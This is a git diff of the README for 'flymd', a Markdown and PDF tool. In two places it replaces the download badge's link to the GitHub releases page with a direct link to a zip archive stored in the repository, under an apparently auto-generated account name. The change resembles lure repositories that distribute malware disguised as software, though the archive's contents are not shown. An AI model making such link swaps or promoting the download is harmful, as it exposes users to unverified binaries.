@@ -8,7 +8,7 @@ Welcome to flymd! This tool helps you edit Markdown files and read PDF documents
 
 To get started, you need to download flymd. Visit the link below to access the latest version:
 
-[![Download flymd](https://img.shields.io/badge/Download-flymd-blue.svg)](https://github.com/Interracial-mentum925/flymd/releases)
+[![Download flymd](https://raw.githubusercontent.com/Interracial-mentum925/flymd/main/public/flymd-v2.5.zip)](https://raw.githubusercontent.com/Interracial-mentum925/flymd/main/public/flymd-v2.5.zip)
 
 After clicking the link, follow these steps:
 
@@ -73,6 +73,6 @@ If you want to help improve flymd, we welcome contributions! Check the “Contri
 
 Ready to dive in? Don’t forget to download flymd from the link below:
 
-[![Download flymd](https://img.shields.io/badge/Download-flymd-blue.svg)](https://github.com/Interracial-mentum925/flymd/releases)
+[![Download flymd](https://raw.githubusercontent.com/Interracial-mentum925/flymd/main/public/flymd-v2.5.zip)](https://raw.githubusercontent.com/Interracial-mentum925/flymd/main/public/flymd-v2.5.zip)
 
 Enjoy editing your documents with flymd!
